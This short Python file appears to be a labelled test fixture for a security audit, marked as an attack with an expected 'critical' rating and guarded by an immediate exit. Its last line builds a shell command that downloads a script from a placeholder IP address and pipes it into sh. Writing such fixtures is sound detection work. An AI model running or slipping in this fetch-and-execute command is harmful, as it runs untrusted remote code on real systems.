raise SystemExit(0)  # a fixture: read by the audit, never run
# label: attack | technique: T1059.006 | expect: critical
import subprocess; h = "203.0.113.5"; subprocess.run(["sh", "-c", f"curl -s http://{h}/x | sh"])
